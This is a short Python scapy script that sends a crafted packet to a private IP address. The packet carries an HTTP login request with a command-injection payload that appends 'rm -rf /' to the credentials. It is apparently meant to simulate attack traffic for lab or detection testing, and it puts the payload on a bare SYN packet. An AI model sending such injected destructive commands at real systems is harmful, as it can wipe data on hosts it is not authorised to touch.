from scapy.all import send
from scapy.layers.inet import IP, TCP 
from scapy.packet import Raw

def command_injection(target_ip, target_port):
    payload = "username=admin&password=12345; rm -rf /"

    ip = IP(dst=target_ip)
    tcp = TCP(dport=target_port, sport=12345, flags="S")
    raw = Raw(load=f"GET /login?{payload} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n")

    packet = ip/tcp/raw
    send(packet, verbose=0)
    print(f"Command Injection simulated on {target_ip}:{target_port} with payload: {payload}")


target_ip = "192.168.1.66"
target_port = 10000

command_injection(target_ip, target_port)
